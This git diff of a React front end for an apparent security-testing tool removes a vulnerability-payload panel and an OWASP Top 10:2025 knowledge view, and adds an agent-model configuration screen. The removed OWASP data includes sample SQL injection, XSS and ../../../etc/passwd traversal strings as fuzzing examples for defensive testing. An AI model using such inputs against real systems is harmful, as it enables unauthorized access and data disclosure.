-        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '12px' }}>
-
-          {vulnCategories.map(vuln => (
-
-            <button
-
-              key={vuln.id}
-
-              onClick={() => setSelectedVuln(selectedVuln === vuln.id ? null : vuln.id)}
-
-              style={{
-
-                background: selectedVuln === vuln.id ? `${vuln.color}25` : 'rgba(15, 15, 26, 0.95)',
-
-                border: `2px solid ${selectedVuln === vuln.id ? vuln.color : 'rgba(255,255,255,0.05)'}`,
-
-                borderRadius: '12px',
-
-                padding: '16px',
-
-                cursor: 'pointer',
-
-                textAlign: 'left',
-
-                transition: 'all 0.2s'
-
-              }}
-
-              onMouseEnter={(e) => {
-
-                if (selectedVuln !== vuln.id) e.currentTarget.style.borderColor = `${vuln.color}50`
-
-              }}
-
-              onMouseLeave={(e) => {
-
-                if (selectedVuln !== vuln.id) e.currentTarget.style.borderColor = 'rgba(255,255,255,0.05)'
-
-              }}
-
-            >
-
-              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '8px' }}>
-
-                <span style={{ fontSize: '24px' }}>{vuln.icon}</span>
-
-                <div>
-
-                  <span style={{ fontSize: '14px', fontWeight: 'bold', color: vuln.color }}>{vuln.name}</span>
-
-                  <span style={{ fontSize: '11px', color: vuln.severity === 'critical' ? '#ff4444' : '#ff8844', marginLeft: '8px', textTransform: 'uppercase' }}>{vuln.severity}</span>
-
-                </div>
-
-              </div>
-
-              <p style={{ fontSize: '11px', color: '#666', marginBottom: '8px' }}>{vuln.description.substring(0, 80)}...</p>
-
-              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-
-                <span style={{ fontSize: '10px', color: '#00ff88' }}>{vuln.bounties}</span>
-
-                <span style={{ fontSize: '10px', color: '#666' }}>{vuln.payloads.length} payloads</span>
-
-              </div>
-
-            </button>
-
-          ))}
-
-        </div>
-
-
-
-        {/* Detail Panel */}
-
-        {selected && (
-
-          <div style={{ 
-
-            background: 'rgba(15, 15, 26, 0.95)',
-
-            borderRadius: '16px',
-
-            padding: '24px',
-
-            border: `2px solid ${selected.color}`,
-
-            maxHeight: '80vh',
-
-            overflow: 'auto'
-
-          }}>
-
-            <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '20px' }}>
-
-              <span style={{ fontSize: '48px' }}>{selected.icon}</span>
-
-              <div>
-
-                <span style={{ fontSize: '12px', fontWeight: 'bold', color: selected.severity === 'critical' ? '#ff4444' : '#ff8844', textTransform: 'uppercase' }}>{selected.severity}</span>
-
-                <h3 style={{ fontSize: '24px', fontWeight: 'bold', color: '#fff' }}>{selected.name}</h3>
-
-                <span style={{ fontSize: '14px', color: '#00ff88' }}>{selected.bounties}</span>
-
-              </div>
-
-            </div>
-
-            
-
-            <p style={{ fontSize: '13px', color: '#aaa', marginBottom: '20px', lineHeight: '1.6' }}>{selected.description}</p>
-
-            
-
-            <div style={{ marginBottom: '20px' }}>
-
-              <h4 style={{ fontSize: '13px', fontWeight: '600', color: selected.color, marginBottom: '8px' }}>🎯 Test Payloads</h4>
-
-              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-
-                {selected.payloads.map((payload, i) => (
-
-                  <code key={i} style={{ 
-
-                    background: 'rgba(0,0,0,0.4)', 
-
-                    color: '#00d4ff', 
-
-                    fontSize: '11px', 
-
-                    padding: '8px 12px', 
-
-                    borderRadius: '4px',
-
-                    fontFamily: 'monospace',
-
-                    overflow: 'auto',
-
-                    whiteSpace: 'nowrap'
-
-                  }}>{payload}</code>
-
-                ))}
-
-              </div>
-
-            </div>
-
-            
-
-            <div style={{ marginBottom: '20px' }}>
-
-              <h4 style={{ fontSize: '13px', fontWeight: '600', color: '#888', marginBottom: '8px' }}>🔍 Detection Techniques</h4>
-
-              <ul style={{ fontSize: '12px', color: '#aaa', listStyle: 'none', padding: 0, margin: 0 }}>
-
-                {selected.detection.map((d, i) => (
-
-                  <li key={i} style={{ marginBottom: '6px', paddingLeft: '16px', position: 'relative' }}>
-
-                    <span style={{ position: 'absolute', left: 0, color: selected.color }}>•</span> {d}
-
-                  </li>
-
-                ))}
-
-              </ul>
-
-            </div>
-
-            
-
-            <div style={{ 
-
-              background: 'rgba(0,0,0,0.3)',
-
-              borderRadius: '8px',
-
-              padding: '16px',
-
-              border: `1px solid ${selected.color}30`
-
-            }}>
-
-              <h4 style={{ fontSize: '12px', fontWeight: '600', color: '#00ff88', marginBottom: '12px' }}>📋 Real HackerOne Reports</h4>
-
-              {selected.realReports.map((report, i) => (
-
-                <div key={i} style={{
-
-                  padding: '12px',
-
-                  background: 'rgba(0,0,0,0.2)',
-
-                  borderRadius: '6px',
-
-                  marginBottom: '8px'
-
-                }}>
-
-                  <div style={{ fontSize: '12px', fontWeight: '600', color: '#fff', marginBottom: '4px' }}>{report.program}</div>
-
-                  <div style={{ fontSize: '11px', color: '#00d4ff', marginBottom: '4px' }}>{report.title}</div>
-
-                  <div style={{ fontSize: '10px', color: '#888' }}>{report.bounty} • {report.link}</div>
-
-                </div>
-
-              ))}
-
-            </div>
-
-          </div>
-
-        )}
-
-      </div>
-
-    </div>
-
-  )
-
-}
 
 
 
@@ -5316,285 +3930,6 @@ function _AutoAgentSelectView() {
 
 
 
-// ============ OWASP TOP 10:2025 KNOWLEDGE VIEW ============
-
-function _OWASPKnowledgeView() {
-
-  const owaspCategories = [
-
-    { code: 'A01', name: 'Broken Access Control', icon: '🔓', color: '#ff4444', year: '2021→2025', description: 'Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data.', cwes: ['CWE-200', 'CWE-201', 'CWE-352', 'CWE-862', 'CWE-863', 'CWE-639'], patterns: ['IDOR', 'Force browsing', 'Privilege escalation', 'CORS misconfiguration'], detection: 'Check for missing authorization checks, predictable resource IDs, insecure direct object references' },
-
-    { code: 'A02', name: 'Security Misconfiguration', icon: '⚙️', color: '#ff8844', year: '2021→2025', description: 'System, application, or cloud service is set up incorrectly from a security perspective. Includes missing hardening, unnecessary features, and verbose error messages.', cwes: ['CWE-16', 'CWE-611', 'CWE-489', 'CWE-526', 'CWE-547'], patterns: ['Default credentials', 'Missing patches', 'Verbose errors', 'Unnecessary features'], detection: 'Scan for debug endpoints, default creds, missing security headers, verbose stack traces' },
-
-    { code: 'A03', name: 'Software Supply Chain Failures', icon: '📦', color: '#ffaa00', year: 'NEW 2025', description: 'Vulnerabilities in third-party components, dependencies, build pipeline, or software distribution. Includes malicious packages, dependency confusion, and CI/CD attacks.', cwes: ['CWE-1104', 'CWE-1391', 'CWE-1595', 'CWE-1411'], patterns: ['Malicious packages', 'Dependency confusion', 'Outdated dependencies', 'License violations'], detection: 'SBOM generation, CVE scanning, malicious package detection, license compliance' },
-
-    { code: 'A04', name: 'Cryptographic Failures', icon: '🔐', color: '#00d4ff', year: '2021→2025', description: 'Weak or broken cryptography exposing sensitive data. Includes improper key management, weak algorithms, and plaintext transmission of sensitive data.', cwes: ['CWE-327', 'CWE-295', 'CWE-312', 'CWE-319', 'CWE-916', 'CWE-798'], patterns: ['Hardcoded secrets', 'Weak encryption', 'Plaintext transmission', 'Insecure random'], detection: 'Scan for API keys, passwords in code, MD5/SHA1 usage, HTTP instead of HTTPS' },
-
-    { code: 'A05', name: 'Injection', icon: '💉', color: '#aa88ff', year: '2021→2025', description: 'Untrusted data sent to an interpreter as part of a command or query. Includes SQL, NoSQL, OS command, LDAP, XPath, and XSS injection.', cwes: ['CWE-79', 'CWE-89', 'CWE-78', 'CWE-90', 'CWE-643', 'CWE-94', 'CWE-95'], patterns: ['SQL injection', 'XSS', 'Command injection', 'Path traversal', 'SSTI'], detection: 'Fuzz with payloads like \' OR \'1\'=\'1, <script>alert(1)</script>, ../../../etc/passwd' },
-
-    { code: 'A06', name: 'Insecure Design', icon: '🏗️', color: '#00ff88', year: '2021→2025', description: 'Missing or ineffective security controls in the application design. Includes business logic flaws, race conditions, and missing rate limiting.', cwes: ['CWE-330', 'CWE-341', 'CWE-400', 'CWE-641', 'CWE-830'], patterns: ['Race conditions', 'Business logic flaws', 'Missing rate limits', 'Flow manipulation'], detection: 'Behavioral analysis, concurrent request testing, workflow validation' },
-
-    { code: 'A07', name: 'Authentication Failures', icon: '🔑', color: '#ff6688', year: '2021→2025', description: 'Authentication weaknesses allowing attackers to impersonate users. Includes credential stuffing, weak passwords, and session fixation.', cwes: ['CWE-287', 'CWE-259', 'CWE-384', 'CWE-307', 'CWE-521', 'CWE-798'], patterns: ['Credential stuffing', 'Weak passwords', 'Session fixation', 'Brute force'], detection: 'Test for missing rate limits, default creds, session token predictability' },
-
-    { code: 'A08', name: 'Software or Data Integrity Failures', icon: '🔧', color: '#88ddff', year: '2021→2025', description: 'Code and infrastructure not protecting against integrity violations. Includes unsafe deserialization, CI/CD vulnerabilities, and dependency hijacking.', cwes: ['CWE-502', 'CWE-94', 'CWE-345', 'CWE-784', 'CWE-829'], patterns: ['Unsafe deserialization', 'CI/CD vulnerabilities', 'Code signing bypass', 'Dependency hijacking'], detection: 'Scan Jenkinsfiles, GitHub workflows, Dockerfiles for security issues' },
-
-    { code: 'A09', name: 'Security Logging and Alerting Failures', icon: '📊', color: '#ffcc00', year: '2021→2025', description: 'Insufficient logging and monitoring for attack detection and response. Includes missing logs, log injection, and inadequate alerting.', cwes: ['CWE-778', 'CWE-223', 'CWE-117', 'CWE-532', 'CWE-73'], patterns: ['Missing audit logs', 'Log injection', 'Insufficient monitoring', 'Delayed alerts'], detection: 'Verify logging exists, check for log injection vulnerabilities, test alert triggers' },
-
-    { code: 'A10', name: 'Mishandling of Exceptional Conditions', icon: '💥', color: '#ff4466', year: 'NEW 2025', description: 'Programs fail to prevent, detect, or respond to unusual situations. Includes error handling bugs, fail-open scenarios, and resource exhaustion.', cwes: ['CWE-209', 'CWE-234', 'CWE-274', 'CWE-476', 'CWE-636', 'CWE-248'], patterns: ['Error info leaks', 'Fail-open scenarios', 'Uncaught exceptions', 'Resource exhaustion'], detection: 'Check for verbose errors, missing timeouts, unhandled edge cases, denial of service' },
-
-  ]
-
-
-
-  const [selectedCategory, setSelectedCategory] = useState<string | null>(null)
-
-  const selected = owaspCategories.find(c => c.code === selectedCategory)
-
-
-
-  return (
-
-    <div>
-
-      {/* Header */}
-
-      <div style={{ 
-
-        background: 'linear-gradient(135deg, rgba(255, 136, 68, 0.15), rgba(255, 68, 136, 0.1))',
-
-        borderRadius: '16px',
-
-        padding: '24px',
-
-        border: '1px solid rgba(255, 136, 68, 0.3)',
-
-        marginBottom: '24px'
-
-      }}>
-
-        <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '12px' }}>
-
-          <span style={{ fontSize: '40px' }}>📋</span>
-
-          <div>
-
-            <h2 style={{ fontSize: '28px', fontWeight: 'bold', background: 'linear-gradient(90deg, #ff8844, #ff4488)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
-
-              OWASP Top 10:2025
-
-            </h2>
-
-            <p style={{ fontSize: '13px', color: '#888' }}>Critical security risks for bug bounty hunting and vulnerability assessment</p>
-
-          </div>
-
-        </div>
-
-        <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
-
-          <span style={{ background: 'rgba(255,68,68,0.2)', color: '#ff4444', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>2 NEW in 2025</span>
-
-          <span style={{ background: 'rgba(0,212,255,0.2)', color: '#00d4ff', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>A03, A10 are new categories</span>
-
-        </div>
-
-      </div>
-
-
-
-      <div style={{ display: 'grid', gridTemplateColumns: selected ? '1fr 1fr' : '1fr', gap: '24px' }}>
-
-        {/* Category Grid */}
-
-        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '12px' }}>
-
-          {owaspCategories.map(cat => (
-
-            <button
-
-              key={cat.code}
-
-              onClick={() => setSelectedCategory(selectedCategory === cat.code ? null : cat.code)}
-
-              style={{
-
-                background: selectedCategory === cat.code ? `${cat.color}25` : 'rgba(15, 15, 26, 0.95)',
-
-                border: `2px solid ${selectedCategory === cat.code ? cat.color : 'rgba(255,255,255,0.05)'}`,
-
-                borderRadius: '12px',
-
-                padding: '16px',
-
-                cursor: 'pointer',
-
-                textAlign: 'left',
-
-                transition: 'all 0.2s'
-
-              }}
-
-              onMouseEnter={(e) => {
-
-                if (selectedCategory !== cat.code) {
-
-                  e.currentTarget.style.borderColor = `${cat.color}50`
-
-                }
-
-              }}
-
-              onMouseLeave={(e) => {
-
-                if (selectedCategory !== cat.code) {
-
-                  e.currentTarget.style.borderColor = 'rgba(255,255,255,0.05)'
-
-                }
-
-              }}
-
-            >
-
-              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '8px' }}>
-
-                <span style={{ fontSize: '24px' }}>{cat.icon}</span>
-
-                <div>
-
-                  <span style={{ fontSize: '14px', fontWeight: 'bold', color: cat.color }}>{cat.code}</span>
-
-                  <span style={{ fontSize: '11px', color: cat.year.startsWith('NEW') ? '#00ff88' : '#666', marginLeft: '8px' }}>{cat.year}</span>
-
-                </div>
-
-              </div>
-
-              <h4 style={{ fontSize: '14px', fontWeight: '600', color: '#fff', marginBottom: '4px' }}>{cat.name}</h4>
-
-              <p style={{ fontSize: '11px', color: '#666', marginBottom: '8px' }}>{cat.description.substring(0, 80)}...</p>
-
-              <div style={{ display: 'flex', gap: '4px', flexWrap: 'wrap' }}>
-
-                {cat.cwes.slice(0, 3).map(cwe => (
-
-                  <span key={cwe} style={{ background: `${cat.color}15`, color: cat.color, fontSize: '9px', padding: '2px 6px', borderRadius: '3px' }}>{cwe}</span>
-
-                ))}
-
-              </div>
-
-            </button>
-
-          ))}
-
-        </div>
-
-
-
-        {/* Detail Panel */}
-
-        {selected && (
-
-          <div style={{ 
-
-            background: 'rgba(15, 15, 26, 0.95)',
-
-            borderRadius: '16px',
-
-            padding: '24px',
-
-            border: `2px solid ${selected.color}`
-
-          }}>
-
-            <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '20px' }}>
-
-              <span style={{ fontSize: '48px' }}>{selected.icon}</span>
-
-              <div>
-
-                <span style={{ fontSize: '14px', fontWeight: 'bold', color: selected.color }}>{selected.code}</span>
-
-                <h3 style={{ fontSize: '24px', fontWeight: 'bold', color: '#fff' }}>{selected.name}</h3>
-
-                <span style={{ fontSize: '11px', color: selected.year.startsWith('NEW') ? '#00ff88' : '#888' }}>{selected.year}</span>
-
-              </div>
-
-            </div>
-
-            
-
-            <p style={{ fontSize: '13px', color: '#aaa', marginBottom: '20px', lineHeight: '1.6' }}>{selected.description}</p>
-
-            
-
-            <div style={{ marginBottom: '20px' }}>
-
-              <h4 style={{ fontSize: '13px', fontWeight: '600', color: '#888', marginBottom: '8px' }}>CWEs (Common Weakness Enumerations)</h4>
-
-              <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap' }}>
-
-                {selected.cwes.map(cwe => (
-
-                  <span key={cwe} style={{ background: `${selected.color}20`, color: selected.color, fontSize: '11px', padding: '4px 10px', borderRadius: '4px', fontFamily: 'monospace' }}>{cwe}</span>
-
-                ))}
-
-              </div>
-
-            </div>
-
-            
-
-            <div style={{ marginBottom: '20px' }}>
-
-              <h4 style={{ fontSize: '13px', fontWeight: '600', color: '#888', marginBottom: '8px' }}>Attack Patterns</h4>
-
-              <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap' }}>
-
-                {selected.patterns.map(p => (
-
-                  <span key={p} style={{ background: 'rgba(255,255,255,0.05)', color: '#00d4ff', fontSize: '11px', padding: '4px 10px', borderRadius: '4px' }}>{p}</span>
-
-                ))}
-
-              </div>
-
-            </div>
-
-            
-
-            <div style={{ 
-
-              background: 'rgba(0,0,0,0.3)',
-
-              borderRadius: '8px',
-
-              padding: '16px',
-
-              border: `1px solid ${selected.color}30`
-
-            }}>
-
-              <h4 style={{ fontSize: '12px', fontWeight: '600', color: selected.color, marginBottom: '8px' }}>🔍 Detection in Sentinel-X</h4>
-
-              <p style={{ fontSize: '12px', color: '#888', lineHeight: '1.5' }}>{selected.detection}</p>
-
-            </div>
-
-          </div>
-
-        )}
-
-      </div>
-
-    </div>
-
-  )
-
-}
 
 
 
@@ -6455,224 +4790,133 @@ function SetupView({ configuredProviders, onProviderConfigured }: {
   )
 
 }
+// ============ AGENT MODELS UI ============
 
+function AgentModelsView() {
+  const [agentModels, setAgentModels] = useState<Record<string, string>>({})
+  const [defaults, setDefaults] = useState<Record<string, string>>({})
+  const [loading, setLoading] = useState(true)
+  const [saving, setSaving] = useState(false)
+  const [error, setError] = useState<string>('')
+  const [success, setSuccess] = useState<string>('')
 
-
-// ============ MODEL CONFIG VIEW ============
-
-function ModelConfigView({ }: { configuredProviders?: Set<string> }) {
-
-  const [agentConfigs, setAgentConfigs] = useState<AgentModelConfig>({
-
-    'recon': 'claude-3.5-sonnet-20241022',
-
-    'code-review': 'claude-3.5-sonnet-20241022',
-
-    'threat-modeling': 'claude-3.5-sonnet-20241022',
-
-    'dependency': 'claude-3.5-sonnet-20241022',
-
-    'debate': 'claude-3.5-sonnet-20241022',
-
-    'remediation': 'claude-3.5-sonnet-20241022'
-
-  })
-
-  const [loading, setLoading] = useState(false)
-
-
-
-  const agents = [
-
-    { id: 'recon', name: '🎯 Recon Agent', description: 'Target discovery, port scanning, OSINT' },
-
-    { id: 'code-review', name: '🔍 Code Review Agent', description: 'SAST with security pattern detection' },
-
-    { id: 'threat-modeling', name: '🛡️ Threat Modeling Agent', description: 'Attack path analysis using knowledge graph' },
-
-    { id: 'dependency', name: '📦 Dependency Agent', description: 'Vulnerability scanning for dependencies' },
-
-    { id: 'debate', name: '⚖️ Debate Engine', description: '5-role adversarial finding validation' },
-
-    { id: 'remediation', name: '🔧 Remediation Agent', description: 'Automated remediation planning' },
-
-  ]
-
-
-
-  const models = [
-
-    'claude-3.5-sonnet-20241022', 'claude-3.5-haiku-20241022', 'claude-3-opus-20240229',
-
-    'gpt-4o', 'gpt-4o-mini', 'gpt-4-turbo',
-
-    'llama-3.3-70b-versatile', 'llama-3.1-70b-versatile', 'llama-3.1-8b-instant',
-
-    'gemini-2.0-flash-exp', 'gemini-1.5-pro'
-
-  ]
-
-
-
-  const handleSave = async () => {
-
-    setLoading(true)
-
+  const fetchModels = async () => {
     try {
-
-      const res = await fetch('/api/config/agent-models', {
-
-        method: 'POST',
-
-        headers: { 'Content-Type': 'application/json' },
-
-        body: JSON.stringify({ agents: agentConfigs }),
-
-      })
-
+      const res = await fetch('/api/agent-models')
       const data = await res.json()
-
-      if (data.status === 'ok') {
-
-        alert('Configuration saved!')
-
-      }
-
-    } catch (e) {
-
-      console.error('Failed to save:', e)
-
+      setAgentModels(data.current || {})
+      setDefaults(data.defaults || {})
+    } catch (e: any) {
+      setError(String(e))
     } finally {
-
       setLoading(false)
-
     }
-
   }
 
+  useEffect(() => { fetchModels() }, [])
 
+  const updateModel = (agent: string, model: string) => {
+    setAgentModels(prev => ({ ...prev, [agent]: model }))
+  }
+
+  const save = async () => {
+    setSaving(true); setError(''); setSuccess('')
+    try {
+      const res = await fetch('/api/agent-models', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ models: agentModels })
+      })
+      if (!res.ok) throw new Error(`HTTP ${res.status}`)
+      setSuccess('Models saved to agent_models.json')
+      setTimeout(() => setSuccess(''), 3000)
+    } catch (e: any) {
+      setError(String(e))
+    } finally {
+      setSaving(false)
+    }
+  }
+
+  const reset = async () => {
+    if (!confirm('Reset all agent models to defaults?')) return
+    setSaving(true); setError('')
+    try {
+      const res = await fetch('/api/agent-models/reset', { method: 'POST' })
+      const data = await res.json()
+      setAgentModels(data.current || {})
+      setSuccess('Reset to defaults')
+      setTimeout(() => setSuccess(''), 3000)
+    } catch (e: any) {
+      setError(String(e))
+    } finally {
+      setSaving(false)
+    }
+  }
+
+  if (loading) return <div style={{ padding: '32px', color: '#888' }}>Loading agent models...</div>
+
+  const agents = Object.keys(defaults)
+  const categories: Record<string, string[]> = {
+    'Reconnaissance': ['recon'],
+    'Code Analysis': ['code-review', 'dependency'],
+    'Threat Modeling': ['threat-modeling', 'threat_intelligence', 'security_operations'],
+    'Advanced': ['adaptive_defense', 'supply-chain', 'api_security'],
+    'Validation': ['debate']
+  }
+  const categoryColors: Record<string, string> = {
+    'Reconnaissance': '#00d4ff',
+    'Code Analysis': '#00ff88',
+    'Threat Modeling': '#ff8844',
+    'Advanced': '#aa88ff',
+    'Validation': '#ffaa00'
+  }
 
   return (
-
-    <div>
-
-      <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>🤖 Agent Model Configuration</h2>
-
-      <p style={{ color: '#666', marginBottom: '32px' }}>Configure a specific model for each Phase 3 security agent</p>
-
-
-
-      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(350px, 1fr))', gap: '16px', marginBottom: '24px' }}>
-
-        {agents.map(agent => (
-
-          <div key={agent.id} style={{
-
-            background: 'rgba(15, 15, 26, 0.95)',
-
-            borderRadius: '16px',
-
-            padding: '20px',
-
-            border: '1px solid rgba(255,255,255,0.05)'
-
-          }}>
-
-            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-
-              <div style={{ fontSize: '24px' }}>{agent.name.split(' ')[0]}</div>
-
-              <div>
-
-                <div style={{ fontSize: '14px', fontWeight: '600' }}>{agent.name.split(' ').slice(1).join(' ')}</div>
-
-                <div style={{ fontSize: '11px', color: '#666' }}>{agent.description}</div>
-
-              </div>
-
-            </div>
-
-            <select
-
-              value={agentConfigs[agent.id] || models[0]}
-
-              onChange={(e) => setAgentConfigs(prev => ({ ...prev, [agent.id]: e.target.value }))}
-
-              style={{
-
-                width: '100%',
-
-                background: 'rgba(0,0,0,0.3)',
-
-                border: '1px solid rgba(255,255,255,0.1)',
-
-                borderRadius: '8px',
-
-                padding: '12px',
-
-                color: '#00d4ff',
-
-                fontSize: '13px',
-
-                fontFamily: 'monospace'
-
-              }}
-
-            >
-
-              {models.map(m => (
-
-                <option key={m} value={m}>{m}</option>
-
-              ))}
-
-            </select>
-
+    <div style={{ padding: '0' }}>
+      <div style={{ background: 'linear-gradient(135deg, rgba(0,212,255,0.1), rgba(0,255,136,0.05))', borderRadius: '12px', padding: '20px', border: '1px solid rgba(0,212,255,0.2)', marginBottom: '24px' }}>
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
+          <div>
+            <h2 style={{ fontSize: '22px', fontWeight: 'bold', marginBottom: '4px', color: '#00d4ff' }}>🤖 Agent Models</h2>
+            <p style={{ fontSize: '13px', color: '#888' }}>Assign which LLM model each agent uses. Saved to <code style={{ color: '#00ff88' }}>agent_models.json</code>.</p>
           </div>
-
-        ))}
-
+          <div style={{ display: 'flex', gap: '8px' }}>
+            <button onClick={reset} disabled={saving} style={{ padding: '8px 16px', background: 'rgba(255,68,68,0.1)', color: '#ff8844', border: '1px solid rgba(255,68,68,0.3)', borderRadius: '6px', cursor: saving ? 'not-allowed' : 'pointer', fontSize: '12px', fontWeight: '600' }}>↺ Reset</button>
+            <button onClick={save} disabled={saving} style={{ padding: '8px 20px', background: saving ? 'rgba(255,255,255,0.1)' : 'linear-gradient(135deg, #00d4ff, #00ff88)', color: saving ? '#666' : '#000', border: 'none', borderRadius: '6px', cursor: saving ? 'not-allowed' : 'pointer', fontSize: '12px', fontWeight: '700' }}>{saving ? '⏳ Saving...' : '💾 Save'}</button>
+          </div>
+        </div>
+        {error && <div style={{ marginTop: '12px', padding: '8px 12px', background: 'rgba(255,68,68,0.1)', color: '#ff4444', borderRadius: '6px', fontSize: '12px' }}>⚠️ {error}</div>}
+        {success && <div style={{ marginTop: '12px', padding: '8px 12px', background: 'rgba(0,255,136,0.1)', color: '#00ff88', borderRadius: '6px', fontSize: '12px' }}>✓ {success}</div>}
       </div>
 
-
-
-      <button 
-
-        onClick={handleSave} 
-
-        disabled={loading}
-
-        style={{
-
-          background: loading ? 'rgba(255,255,255,0.1)' : 'linear-gradient(135deg, #00d4ff, #00ff88)',
-
-          color: loading ? '#666' : '#000',
-
-          border: 'none',
-
-          borderRadius: '10px',
-
-          padding: '14px 28px',
-
-          fontWeight: '700',
-
-          cursor: loading ? 'not-allowed' : 'pointer',
-
-          fontSize: '14px'
-
-        }}>
-
-        {loading ? 'Saving...' : 'Save Agent Configuration'}
-
-      </button>
-
+      {Object.entries(categories).map(([cat, agentIds]) => {
+        const validAgents = agentIds.filter(a => agents.includes(a))
+        if (validAgents.length === 0) return null
+        const color = categoryColors[cat] || '#888'
+        return (
+          <div key={cat} style={{ marginBottom: '20px' }}>
+            <h3 style={{ fontSize: '14px', fontWeight: '600', color, marginBottom: '12px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>{cat}</h3>
+            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '12px' }}>
+              {validAgents.map(agent => {
+                const current = agentModels[agent] || defaults[agent] || ''
+                const isCustom = current !== (defaults[agent] || '')
+                return (
+                  <div key={agent} style={{ background: 'rgba(15,15,26,0.95)', border: `1px solid ${isCustom ? color + '60' : 'rgba(255,255,255,0.05)'}`, borderRadius: '10px', padding: '14px' }}>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
+                      <span style={{ fontSize: '13px', fontWeight: '600', color: '#fff' }}>{agent}</span>
+                      {isCustom && <span style={{ fontSize: '9px', background: color + '30', color, padding: '2px 6px', borderRadius: '3px', fontWeight: '700' }}>CUSTOM</span>}
+                    </div>
+                    <input type='text' value={current} onChange={(e) => updateModel(agent, e.target.value)} placeholder={defaults[agent] || 'model-name'} style={{ width: '100%', padding: '8px 10px', background: '#0a0a0a', color: color, border: '1px solid rgba(255,255,255,0.1)', borderRadius: '5px', fontSize: '12px', fontFamily: 'monospace', outline: 'none', boxSizing: 'border-box' }} />
+                    <div style={{ fontSize: '10px', color: '#666', marginTop: '6px' }}>default: {defaults[agent] || '—'}</div>
+                  </div>
+                )
+              })}
+            </div>
+          </div>
+        )
+      })}
     </div>
-
   )
-
 }
-
-
 
 function LoadingSpinner() {
 
